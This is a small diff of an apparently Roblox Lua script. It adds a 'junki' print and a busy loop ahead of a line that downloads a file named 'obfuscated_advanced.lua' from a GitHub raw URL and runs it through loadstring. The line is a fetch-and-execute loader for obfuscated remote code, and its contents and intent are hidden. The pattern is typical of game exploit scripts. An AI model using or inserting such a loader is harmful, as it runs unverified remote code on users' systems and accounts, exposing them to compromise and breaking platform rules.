@@ -1,1 +1,9 @@
+print("junki")
+for i = 1, 1e7 do
+    if i % 1000 == 0 then
+        task.wait() -- yields execution
+    end
+    math.sqrt(i)
+end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ProGamerBoy610/TestingGui/refs/heads/main/obfuscated_advanced.lua%20(3).txt"))()
